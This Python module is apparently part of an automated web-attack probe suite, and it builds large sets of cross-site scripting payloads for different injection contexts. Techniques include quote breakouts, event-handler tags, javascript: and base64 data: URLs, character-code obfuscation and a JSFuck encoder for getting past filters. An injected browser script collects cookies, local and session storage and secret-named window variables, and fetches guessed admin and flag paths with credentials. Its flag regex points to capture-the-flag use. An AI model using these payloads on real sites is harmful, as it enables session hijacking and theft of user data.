from __future__ import annotations

import base64
import json

from ravage.probe_suite_parts.support import _dedupe

_DOM_EXEC_FETCH_TIMEOUT_MS = 1200
_XSS_PROOF_TOKENS = ("XSS", "SUCCESS")
_JSFUCK_MAX_TEXT_CHARS = 16


def _dom_exec_payloads(
    token: str,
    exec_binding: str,
    contexts: list[dict[str, object]] | None = None,
) -> list[str]:
    call = f"{exec_binding}('{token}')"
    dialog = f"alert('{token}')"
    proof_call = _browser_proof_extractor_call(token, exec_binding)
    payloads: list[str] = []
    for context in contexts or []:
        context_payloads = _dom_exec_payloads_for_context(
            context,
            call,
            dialog,
            proof_call,
        )
        payloads.extend(context_payloads)
    payloads.extend(_default_dom_exec_payloads(call, proof_call))
    return _dedupe(payloads)


def _dom_exec_payloads_for_context(
    context: dict[str, object],
    call: str,
    dialog: str,
    proof_call: str,
) -> list[str]:
    name = str(context.get("context") or "")
    quote_char = str(context.get("quote_char") or "")
    tag_name = str(context.get("tag_name") or "")
    attribute_name = str(context.get("attribute_name") or "")

    payloads: list[str] = []
    if _context_is_url_sink(name, tag_name, attribute_name):
        payloads.extend(_dom_url_sink_payloads(call, dialog, proof_call))
    payloads.extend(_dom_payloads_for_context_name(name, quote_char, call, proof_call))
    return payloads


def _dom_url_sink_payloads(call: str, dialog: str, proof_call: str) -> list[str]:
    payloads: list[str] = []
    payloads.extend(_url_sink_payloads(proof_call, proof_call))
    payloads.extend(_url_sink_payloads(call, dialog))
    return payloads


def _dom_payloads_for_context_name(
    name: str,
    quote_char: str,
    call: str,
    proof_call: str,
) -> list[str]:
    if name == "js_string_double" or quote_char == '"':
        return _js_string_dom_payloads('"', call, proof_call)
    if name == "js_string_single" or quote_char == "'":
        return _js_string_dom_payloads("'", call, proof_call)
    if name == "js_string_template":
        return _js_template_string_dom_payloads(call, proof_call)
    if name == "js_code":
        return _js_code_dom_payloads(call, proof_call)
    if name == "html_attribute_quoted":
        quote = _attribute_quote(quote_char)
        return _html_attribute_quoted_dom_payloads(quote, call, proof_call)
    if name in {"html_body", "html_tag", "html_attribute_unquoted"}:
        return _html_body_dom_payloads(call, proof_call)
    if name == "html_comment":
        return _html_comment_dom_payloads(call, proof_call)
    return []


def _js_string_dom_payloads(quote: str, call: str, proof_call: str) -> list[str]:
    payloads: list[str] = []
    payloads.extend(_js_string_direct_exec_payloads(quote, call, proof_call))
    payloads.extend(_js_string_filter_safe_dialog_payloads(quote))
    payloads.extend(_js_string_escaped_quote_payloads(quote))
    payloads.extend(_js_string_computed_dialog_payloads(quote))
    payloads.extend(_js_string_token_breakout_payloads(quote))
    return payloads


def _js_string_token_breakout_payloads(quote: str) -> list[str]:
    payloads: list[str] = []
    for proof_token in _XSS_PROOF_TOKENS:
        for function_name in ("alert", "confirm", "prompt"):
            payloads.append(f"{quote};{function_name}({proof_token!r});//")
    return payloads


def _js_string_direct_exec_payloads(quote: str, call: str, proof_call: str) -> list[str]:
    if quote == '"':
        return [
            f'";{proof_call};//',
            f'";{call};//',
            f'";setTimeout(function(){{{call}}},0);//',
            '";window[String.fromCharCode(97,108,101,114,116)]("XSS");//',
            '";this[String.fromCharCode(99,111,110,102,105,114,109)]("XSS");//',
        ]
    return [
        f"';{proof_call};//",
        f"';{call};//",
        f"';setTimeout(function(){{{call}}},0);//",
        "';window[String.fromCharCode(97,108,101,114,116)]('XSS');//",
        "';this[String.fromCharCode(99,111,110,102,105,114,109)]('XSS');//",
    ]


def _js_template_string_dom_payloads(call: str, proof_call: str) -> list[str]:
    return [f"${{{proof_call}}}", f"${{{call}}}", f"`;{call};//"]


def _js_code_dom_payloads(call: str, proof_call: str) -> list[str]:
    return [proof_call, call, f";{call};//"]


def _html_attribute_quoted_dom_payloads(quote: str, call: str, proof_call: str) -> list[str]:
    payloads: list[str] = []
    payloads.extend(_quoted_svg_alert_payloads(quote))
    payloads.extend(_quoted_svg_dialog_payloads(quote))
    payloads.append(f"{quote} autofocus onfocus={proof_call} x={quote}")
    payloads.append(f"{quote}><svg onload=\"{proof_call}\">")
    payloads.append(f"{quote} autofocus onfocus={call} x={quote}")
    payloads.append(f"{quote}><svg onload={call}>")
    return payloads


def _quoted_svg_alert_payloads(quote: str) -> list[str]:
    payloads: list[str] = []
    for token in _XSS_PROOF_TOKENS:
        payloads.append(f"{quote}><svg onload=alert('{token}')>")
    return payloads


def _quoted_svg_dialog_payloads(quote: str) -> list[str]:
    payloads: list[str] = []
    for token in _XSS_PROOF_TOKENS:
        for function_name in ("confirm", "prompt"):
            payloads.append(f"{quote}><svg onload={function_name}('{token}')>")
    return payloads


def _html_comment_dom_payloads(call: str, proof_call: str) -> list[str]:
    payloads: list[str] = []
    for token in _XSS_PROOF_TOKENS:
        payloads.append(f"--><svg onload=alert('{token}')>")
    for token in _XSS_PROOF_TOKENS:
        for function_name in ("confirm", "prompt"):
            payloads.append(f"--><svg onload={function_name}('{token}')>")
    payloads.append(f"--><svg onload=\"{proof_call}\">")
    payloads.append(f"--><svg onload={call}>")
    return payloads


def _context_is_url_sink(context: str, tag_name: str, attribute_name: str) -> bool:
    if context in {"url_context", "url_attribute", "iframe_src"}:
        return True
    if tag_name == "iframe" and attribute_name == "src":
        return True
    if attribute_name in {"href", "src", "action", "formaction", "xlink:href"}:
        return True
    return False


def _url_sink_payloads(call: str, dialog: str) -> list[str]:
    payloads: list[str] = []
    for proof_token in _XSS_PROOF_TOKENS:
        for function_name in ("alert", "confirm", "prompt"):
            literal_call = f"{function_name}('{proof_token}')"
            payloads.extend(
                [
                    f"javascript:{literal_call}",
                    f"java%0ascript:{literal_call}",
                    _data_html_script_url(literal_call),
                ]
            )
    payloads.extend(
        [
            f"javascript:{dialog}",
            f"javascript:{call}",
            f"java%0ascript:{dialog}",
            _data_html_script_url(dialog),
        ]
    )
    return _dedupe(payloads)


def _js_string_computed_dialog_payloads(quote: str) -> list[str]:
    if quote not in {"'", '"'}:
        return []
    alert_lookup = "String.fromCharCode(97,108,101,114,116)"
    token_exprs = [
        "String.fromCharCode(88,83,83)",
        "String.fromCharCode(83,85,67,67,69,83,83)",
    ]
    payloads: list[str] = []
    for token_expr in token_exprs:
        payloads.extend(
            [
                f"{quote};window[{alert_lookup}]({token_expr});//",
                f"{quote};top[{alert_lookup}]({token_expr});//",
                f"{quote};self[{alert_lookup}]({token_expr});//",
                f"{quote};setTimeout(function(){{window[{alert_lookup}]({token_expr})}},0);//",
            ]
        )
    return payloads


def _js_string_filter_safe_dialog_payloads(quote: str) -> list[str]:
    if quote not in {"'", '"'}:
        return []
    payloads: list[str] = []
    for call in _filter_safe_xss_dialog_calls():
        payloads.append(f"{quote};{call};//")
    return payloads


def _js_string_escaped_quote_payloads(quote: str) -> list[str]:
    if quote not in {"'", '"'}:
        return []
    payloads: list[str] = []
    for backslash_count in (1, 3):
        prefix = ("\\" * backslash_count) + quote
        for call in _filter_safe_xss_dialog_calls():
            payloads.append(f"{prefix};{call};//")
    return payloads


def _filter_safe_xss_dialog_calls() -> list[str]:
    return [
        r"alert(`\x58\x53\x53`)",
        r"confirm(`\x58\x53\x53`)",
        r"prompt(`\x58\x53\x53`)",
        r'alert("\x58\x53\x53")',
        r'confirm("\x58\x53\x53")',
        r"setTimeout(alert,0,`\x58\x53\x53`)",
    ]


def _data_html_script_url(script: str) -> str:
    html = f"<script>{script}</script>".encode("utf-8")
    encoded = base64.b64encode(html).decode("ascii")
    return f"data:text/html;base64,{encoded}"


def _attribute_quote(quote_char: str) -> str:
    if quote_char in {"'", '"'}:
        return quote_char
    return '"'


def _default_dom_exec_payloads(call: str, proof_call: str) -> list[str]:
    token_match = call.split("'", 2)
    token = _token_from_exec_call(token_match)
    dialog = f"alert('{token}')"
    obfuscated_alert = "window[String.fromCharCode(97,108,101,114,116)]"
    payloads: list[str] = []
    payloads.extend(_default_fixed_dom_exec_payloads(call, dialog, proof_call, obfuscated_alert))
    payloads.extend(_js_string_filter_safe_dialog_payloads('"'))
    payloads.extend(_js_string_filter_safe_dialog_payloads("'"))
    payloads.extend(_js_string_escaped_quote_payloads('"'))
    payloads.extend(_js_string_escaped_quote_payloads("'"))
    payloads.extend(_js_string_computed_dialog_payloads('"'))
    payloads.extend(_js_string_computed_dialog_payloads("'"))
    payloads.extend(_default_jsfuck_breakout_payloads())
    payloads.extend(_html_body_dom_payloads(call, proof_call))
    payloads.extend(_default_svg_alert_payloads())
    payloads.extend(_default_svg_dialog_payloads())
    payloads.extend(_default_details_dialog_payloads())
    return payloads


def _token_from_exec_call(token_match: list[str]) -> str:
    if len(token_match) > 1:
        return token_match[1]
    return "RAVAGE_XSS"


def _default_jsfuck_breakout_payloads() -> list[str]:
    payloads: list[str] = []
    for proof_token in _XSS_PROOF_TOKENS:
        payloads.extend(_jsfuck_string_breakout_payloads(proof_token))
    return payloads


def _default_svg_alert_payloads() -> list[str]:
    payloads: list[str] = []
    for proof_token in _XSS_PROOF_TOKENS:
        payloads.append(f"<svg onload=alert('{proof_token}')>")
    return payloads


def _default_svg_dialog_payloads() -> list[str]:
    payloads: list[str] = []
    for proof_token in _XSS_PROOF_TOKENS:
        for function_name in ("confirm", "prompt"):
            payloads.append(f"<svg onload={function_name}('{proof_token}')>")
    return payloads


def _default_details_dialog_payloads() -> list[str]:
    payloads: list[str] = []
    for proof_token in _XSS_PROOF_TOKENS:
        for function_name in ("alert", "confirm", "prompt"):
            payloads.append(f"<details open ontoggle={function_name}('{proof_token}')>")
    return payloads


def _default_fixed_dom_exec_payloads(
    call: str,
    dialog: str,
    proof_call: str,
    obfuscated_alert: str,
) -> list[str]:
    return [
        "<image/src/onerror=alert('XSS')>",
        '<image/src/onerror=alert("XSS")>',
        "<image src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        '<svg onload=alert("XSS")>',
        "<img src=x onerror=alert('XSS')>",
        '<img src=x onerror=alert("XSS")>',
        "<details open ontoggle=alert('XSS')>",
        "<input autofocus onfocus=alert('XSS')>",
        f"<svg onload=\"{proof_call}\">",
        f'"><svg onload="{call}">',
        f"<svg/onload={obfuscated_alert}(location.pathname)>",
        f"<svg/onload={obfuscated_alert}(document.body.innerHTML)>",
        f"<svg/onload={obfuscated_alert}(document.documentElement.outerHTML)>",
        f"<img src=x onerror=\"{proof_call}\">",
        f'"><img src=x onerror="{call}">',
        f"<img src=x onerror={obfuscated_alert}(location.pathname)>",
        f"javascript:{dialog}",
        f"javascript:{call}",
        f"<script>{call}</script>",
        f'"><script>{call}</script>',
        f'";{call};//',
        f"';{call};//",
        f"</title><script>{call}</script>",
        f"</textarea><script>{call}</script>",
    ]


def _html_body_dom_payloads(call: str, proof_call: str) -> list[str]:
    payloads: list[str] = []
    for proof_token in _XSS_PROOF_TOKENS:
        payloads.extend(_html_body_token_payloads(proof_token))
    payloads.extend(_html_body_probe_payloads(call, proof_call))
    return _dedupe(payloads)


def _html_body_token_payloads(proof_token: str) -> list[str]:
    payloads: list[str] = []
    payloads.extend(_html_body_frame_payloads(proof_token))
    payloads.extend(_html_body_event_payloads(proof_token))
    payloads.extend(_html_body_active_content_payloads(proof_token))
    payloads.extend(_html_body_autofocus_payloads(proof_token))
    return payloads


def _html_body_frame_payloads(proof_token: str) -> list[str]:
    alert_call = f"alert('{proof_token}')"
    data_url = _data_html_script_url(alert_call)
    return [
        f"<iframe onload=alert('{proof_token}')></iframe>",
        f"<iframe src=javascript:alert('{proof_token}')></iframe>",
        f"<iframe srcdoc=\"&lt;script&gt;alert('{proof_token}')&lt;/script&gt;\"></iframe>",
        f'<iframe src="{data_url}"></iframe>',
    ]


def _html_body_event_payloads(proof_token: str) -> list[str]:
    animation_payload = (
        "<style>@keyframes r{from{opacity:.9}to{opacity:1}}</style>"
        f"<p style=animation-name:r;animation-duration:1s onanimationstart=alert('{proof_token}')>x</p>"
    )
    return [
        f"<x autofocus tabindex=1 onfocus=alert('{proof_token}')>x</x>",
        f"<x style=display:block;animation-name:a;animation-duration:1s onanimationstart=alert('{proof_token}')>x</x>",
        f"<source src=x onerror=alert('{proof_token}')>",
        f"<audio src=x onerror=alert('{proof_token}')>",
        animation_payload,
        f"<details open ontoggle=alert('{proof_token}')>",
        f"<marquee onstart=alert('{proof_token}')>x</marquee>",
    ]


def _html_body_active_content_payloads(proof_token: str) -> list[str]:
    return [
        f"<object data=javascript:alert('{proof_token}')>",
        f"<embed src=javascript:alert('{proof_token}')>",
        f"<link rel=stylesheet href=data:text/css,*{{}} onload=alert('{proof_token}')>",
        f"<svg onload=alert('{proof_token}')>",
    ]


def _html_body_autofocus_payloads(proof_token: str) -> list[str]:
    return [
        f"autofocus onfocus=alert('{proof_token}') x=",
        f"<input autofocus onfocus=alert('{proof_token}')>",
        f"<button autofocus onfocus=alert('{proof_token}')>x</button>",
        f"<select autofocus onfocus=alert('{proof_token}')><option>x</option></select>",
        f"<textarea autofocus onfocus=alert('{proof_token}')>x</textarea>",
    ]


def _html_body_probe_payloads(call: str, proof_call: str) -> list[str]:
    return [
        f'<iframe onload="{proof_call}"></iframe>',
        f'<iframe srcdoc="&lt;script&gt;{proof_call}&lt;/script&gt;"></iframe>',
        f'autofocus onfocus="{proof_call}" x=',
        f'<x autofocus tabindex=1 onfocus="{proof_call}">x</x>',
        f'<source src=x onerror="{proof_call}">',
        f'<audio src=x onerror="{proof_call}">',
        f'<object data="javascript:{call}">',
        f'<embed src="javascript:{call}">',
        f'<link rel=stylesheet href="data:text/css,*{{}}" onload="{proof_call}">',
        f'<svg onload="{proof_call}">',
        f'<input autofocus onfocus="{proof_call}">',
        f'<button autofocus onfocus="{proof_call}">x</button>',
        f"<select autofocus onfocus=\"{proof_call}\"><option>x</option></select>",
        f"<textarea autofocus onfocus=\"{proof_call}\">x</textarea>",
        f"<img src=x onerror=\"{proof_call}\">",
        f"<img src=x onerror={call}>",
    ]


def _jsfuck_string_breakout_payloads(text: str) -> list[str]:
    call = _jsfuck_alert_call(text)
    if not call:
        return []
    return [
        f'";{call};//',
        f"';{call};//",
    ]


def _jsfuck_alert_call(text: str) -> str:
    if not text or len(text) > _JSFUCK_MAX_TEXT_CHARS:
        return ""
    if not _text_can_be_jsfuck_encoded(text):
        return ""
    encoder = _JsFuckStringBuilder()
    return f"[][{encoder.string('filter')}][{encoder.string('constructor')}]({encoder.alert_code(text)})()"


def _text_can_be_jsfuck_encoded(text: str) -> bool:
    for char in text:
        if ord(char) > 0o377:
            return False
    return True


class _JsFuckStringBuilder:
    def __init__(self) -> None:
        self._filter_expr: str | None = None
        self._function_string_expr: str | None = None

    def string(self, value: str) -> str:
        parts: list[str] = []
        for char in value:
            if char in "()'\"\\/;":
                parts.append(json.dumps(char))
            elif char.isdigit():
                parts.append(self._digit(char))
            elif char == "\n":
                parts.append(json.dumps(char))
            else:
                parts.append(self._char(char))
        if not parts:
            return "[]+[]"
        return "+".join(parts)

    def alert_code(self, text: str) -> str:
        escaped = _octal_escaped_text(text)
        return self.string(f"alert('{escaped}')")

    def _char(self, char: str) -> str:
        if char == "f":
            return self._from("![]+[]", 0)
        if char == "a":
            return self._from("![]+[]", 1)
        if char == "l":
            return self._from("![]+[]", 2)
        if char == "s":
            return self._from("![]+[]", 3)
        if char == "e":
            return self._from("![]+[]", 4)
        if char == "t":
            return self._from("!![]+[]", 0)
        if char == "r":
            return self._from("!![]+[]", 1)
        if char == "u":
            return self._from("[][[]]+[]", 0)
        if char == "n":
            return self._from("[][[]]+[]", 1)
        if char == "d":
            return self._from("[][[]]+[]", 2)
        if char == "i":
            return self._from("[][[]]+[]", 5)
        if char == "c":
            return self._from(self._function_string(), 3)
        if char == "o":
            return self._from(self._function_string(), 6)
        return ""

    def _filter(self) -> str:
        if self._filter_expr is None:
            self._filter_expr = (
                self._char("f")
                + "+"
                + self._char("i")
                + "+"
                + self._char("l")
                + "+"
                + self._char("t")
                + "+"
                + self._char("e")
                + "+"
                + self._char("r")
            )
        return self._filter_expr

    def _function_string(self) -> str:
        if self._function_string_expr is None:
            self._function_string_expr = f"[][({self._filter()})]+[]"
        return self._function_string_expr

    def _from(self, source: str, index: int) -> str:
        return f"({source})[{self._number(index)}]"

    def _digit(self, digit: str) -> str:
        return f"({self._number(int(digit))}+[])"

    def _number(self, value: int) -> str:
        if value <= 0:
            return "+[]"
        if value == 1:
            return "+!+[]"
        parts: list[str] = []
        for _index in range(value):
            parts.append("!+[]")
        return "+".join(parts)


def _octal_escaped_text(text: str) -> str:
    parts: list[str] = []
    for char in text:
        parts.append("\\" + format(ord(char), "03o"))
    return "".join(parts)


def _browser_proof_extractor_call(token: str, exec_binding: str) -> str:
    paths = _browser_probe_paths()
    rendered_paths = _rendered_browser_probe_paths(paths)
    proof_regex = r"/(?:flag|FLAG|HTB|CTF)\{[^\}\s]{3,256}\}/"
    script_parts = [
        _browser_probe_setup_js(rendered_paths),
        _browser_storage_capture_js(),
        _browser_window_capture_js(),
        _browser_path_normalizer_js(),
        _browser_probe_path_queue_js(),
        _browser_fetch_probe_js(),
        _browser_probe_result_handler_js(proof_regex, exec_binding, token),
    ]
    return "".join(script_parts)


def _browser_probe_paths() -> list[str]:
    return [
        "/flag",
        "/flag.txt",
        "/proof",
        "/proof.txt",
        "/secret",
        "/admin",
        "/debug",
        "/api/flag",
        "/static/flag.txt",
        "/static/proof.txt",
    ]


def _browser_probe_setup_js(rendered_paths: str) -> str:
    return (
        "(function(){var fixed=["
        + rendered_paths
        + "];var attrs=[];var nodes=document.querySelectorAll('[href],[src],[action]');"
        + "for(var i=0;i<nodes.length;i++){attrs.push(nodes[i].href||nodes[i].src||nodes[i].action||'')}"
        + "var cur=["
        + "location.pathname,"
        + "location.pathname.replace(/[^\\/]+$/,'')+'flag',"
        + "location.pathname.replace(/[^\\/]+$/,'')+'proof'"
        + "];"
        + "var extra=[document.cookie,document.title,location.href,window.name];"
    )


def _browser_storage_capture_js() -> str:
    return _browser_local_storage_capture_js() + _browser_session_storage_capture_js()


def _browser_local_storage_capture_js() -> str:
    return (
        "try{"
        + "if(window.localStorage){"
        + "for(var ls=0;ls<localStorage.length&&ls<20;ls++){"
        + "var lk=localStorage.key(ls);"
        + "extra.push('localStorage.'+lk+'='+localStorage.getItem(lk))"
        + "}"
        + "}"
        + "}catch(e){}"
    )


def _browser_session_storage_capture_js() -> str:
    return (
        "try{"
        + "if(window.sessionStorage){"
        + "for(var ss=0;ss<sessionStorage.length&&ss<20;ss++){"
        + "var sk=sessionStorage.key(ss);"
        + "extra.push('sessionStorage.'+sk+'='+sessionStorage.getItem(sk))"
        + "}"
        + "}"
        + "}catch(e){}"
    )


def _browser_window_capture_js() -> str:
    return (
        "try{"
        + "Object.keys(window).forEach(function(k){"
        + "if(/flag|proof|secret|token/i.test(k)){"
        + "try{extra.push('window.'+k+'='+String(window[k]).slice(0,500))}catch(e){}"
        + "}"
        + "})"
        + "}catch(e){}"
    )


def _browser_path_normalizer_js() -> str:
    return (
        "function norm(raw){"
        + "try{"
        + "var a=document.createElement('a');"
        + "a.href=raw;"
        + "if(a.protocol===location.protocol&&a.host===location.host){"
        + "return a.pathname+a.search"
        + "}"
        + "}catch(e){}"
        + "return ''"
        + "}"
    )


def _browser_probe_path_queue_js() -> str:
    return (
        "var seen={};var p=[];var all=fixed.concat(attrs).concat(cur);"
        + "for(var j=0;j<all.length&&p.length<18;j++){var v=norm(all[j]);if(v&&!seen[v]){seen[v]=1;p.push(v)}}"
    )


def _browser_fetch_probe_js() -> str:
    return (
        "function one(x){"
        + "return new Promise(function(res){"
        + "var c=new AbortController();"
        + "setTimeout(function(){c.abort()},"
        + str(_DOM_EXEC_FETCH_TIMEOUT_MS)
        + ");"
        + "fetch(x,{credentials:'include',signal:c.signal})"
        + ".then(function(r){"
        + "r.text().then(function(t){"
        + "res({u:x,s:r.status,t:t.slice(0,220).replace(/[\\r\\n]+/g,' ')})"
        + "})"
        + "})"
        + ".catch(function(e){res({u:x,s:0,t:String(e).slice(0,80)})});"
        + "})"
        + "}"
    )


def _browser_probe_result_handler_js(
    proof_regex: str,
    exec_binding: str,
    token: str,
) -> str:
    return (
        "Promise.all(p.map(one)).then(function(a){"
        + "var body=document.body?document.body.innerText:'';"
        + "var texts=[];"
        + "for(var k=0;k<a.length;k++){texts.push(a[k].t)}"
        + "var t=body+'\\n'+texts.join('\\n');"
        + "t+='\\n'+extra.join('\\n');"
        + "console.log('RAVAGE_BROWSER_SCAN '+JSON.stringify(extra).slice(0,1800));"
        + "console.log('RAVAGE_FETCH_SCAN '+JSON.stringify(a));"
        + "if("
        + proof_regex
        + ".test(t)){"
        + exec_binding
        + "('"
        + token
        + " '+t)}})})()"
    )


def _rendered_browser_probe_paths(paths: list[str]) -> str:
    rendered: list[str] = []
    for path in paths:
        rendered.append(f"'{path}'")
    return ",".join(rendered)
